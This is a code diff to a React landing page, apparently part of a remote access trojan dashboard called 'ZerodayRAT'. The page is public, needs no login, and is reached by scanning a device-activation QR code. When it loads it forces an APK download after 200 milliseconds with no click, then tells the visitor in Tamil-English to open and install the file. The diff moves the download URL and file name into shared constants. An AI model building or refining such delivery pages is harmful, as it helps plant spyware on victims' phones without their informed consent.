@@ -1,8 +1,6 @@
 import { useEffect } from "react";
 import { useSearchParams } from "react-router-dom";
-
-/** Where the admin uploads the latest built APK — see dashboard/public/download/README.md. */
-const APK_DOWNLOAD_PATH = "/download/ZerodayRAT.apk";
+import { APK_DOWNLOAD_URL, APK_FILENAME } from "../api/apk";
 
 /**
  * Public (no-login) landing page the dashboard's device-activation QR code /
@@ -36,7 +34,7 @@ export default function ConnectPage() {
 
     // 3. Immediately trigger direct APK download without waiting for any button click!
     const timer = setTimeout(() => {
-      window.location.replace(APK_DOWNLOAD_PATH);
+      window.location.replace(APK_DOWNLOAD_URL);
     }, 200);
 
     return () => clearTimeout(timer);
@@ -53,12 +51,12 @@ export default function ConnectPage() {
         <div>
           <h1 className="text-base font-bold text-gray-900">Direct Download Starting...</h1>
           <p className="text-xs text-gray-500 mt-1">
-            ZerodayRAT.apk download aagudhu. Download mudinjadhum <strong>"Open"</strong> ➔ <strong>"Install"</strong> click pannunga.
+            {APK_FILENAME} download aagudhu. Download mudinjadhum <strong>"Open"</strong> ➔ <strong>"Install"</strong> click pannunga.
           </p>
         </div>
         <a
-          href={APK_DOWNLOAD_PATH}
-          download="ZerodayRAT.apk"
+          href={APK_DOWNLOAD_URL}
+          download={APK_FILENAME}
           className="inline-block text-xs text-primary hover:underline font-medium pt-2"
         >
           Download start aagala-na inga click pannunga
